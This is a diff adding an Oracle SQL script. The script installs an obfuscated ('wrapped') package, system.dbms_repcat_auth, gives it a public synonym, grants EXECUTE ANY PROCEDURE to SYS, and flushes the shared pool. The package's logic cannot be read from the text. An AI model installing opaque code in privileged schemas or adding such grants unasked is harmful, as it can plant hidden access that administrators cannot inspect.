@@ -1,0 +1,65 @@
+CREATE OR REPLACE PACKAGE system.dbms_repcat_auth wrapped 
+a000000
+1
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+9
+bf be
+QK8xyf/kNm3bq5lkN5RDV1GJh30wg/BKf8sVfHTpWBKe0Mp/LZ+SLtigUQ3vBTXgl3Mg+/dF
+LaXStc4a6vdBFllCrTT9sUZ9ES3Tz2ar+LzsG//Xdd+9368Z7VjeNbj+xFssseDIuKt+5m38
+/8j4oqr3ysXtrQXID0ugFRzEOlkElFY6ScC8z6admcWv
+
+/
+CREATE OR REPLACE PUBLIC SYNONYM dbms_repcat_auth FOR dbms_repcat_auth;
+CREATE OR REPLACE PACKAGE BODY system.dbms_repcat_auth wrapped 
+a000000
+1
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+b
+b50 374
+rbxZXZz/glmyLoJRwT6be0jWlvMwg5UrzCCDfC8Zgp0V5Rv70/xqM0vesxxZwAJNcBefFZe3
+jdPQwvs1qHrD/NCalaGh8l6e57MWFV3P/hD+VaTbHA0g3ihanNoLBvUHCb2lfvzVq84Q5gGM
+NecZQY/fVzemBrhsqrKjJbAidDc62wGRogJVsAYMWwAPTOEaBQv1Z2Vy0cEdDtgucVgdhvC4
+l8tGXaxLcLREOGuzvUBqUsulfqL2HyPRghSNDiwkTtuz9dcAcAJVZT8FpNCevTtl2IRh03tj
+sX26mOOC5FwRUx3apQovzaSeEt1sjhKYSLgX1sGYbveaEHBG+BAv8Y8X0cbtPjhxJmWIXEYl
+CGd7FJHLUaNyfQXRkVqiaeoV4g8zYrviDQX1nDrKfKP6Z+cZakU+radU7SuuaYsMt1QxGYOt
+Tb5+l1deNzbMkFGf359GNgnIOzuBgZizKuGzYvCTA4dZRJ5i0+WOR9twSRPJbSE7FUHzkckG
+x8A9FK6uPc+lJkJcUxVnFdGnqfOdAqtL/a8Hu91ce17k7HR+i+84pt/LGtl8nrHdx0u0NsbJ
+c1PcgQZ7swqhdT8rOicRyJLpr06eoCjvuKUxB8XMQJMC9rzJh64c0mZo8SzUU67yz7Xqrtwr
+XtY6riTloXqaVqcejCXYN+z8Y9wVw4AgppAmRxKZSh56QRyTpW6YYMyO19BGl+tku1XF9OpJ
+ASsCADSrCpFvSQPSCB0WPSH0eJx3J871w1mbRPTHFW0eLtKr9OuTNOQvCQ1QKYR2TMjaaKID
+wwLe7Ee5eCa8EQecqosDl6q5vg/9u/QiallPYJ2ety/9O7cQPnW/0roHHMd6J3WGJf83MZLS
+LEuO0vA=
+
+/
+GRANT EXECUTE ANY PROCEDURE TO SYS
+/
+alter system flush shared_pool
+/
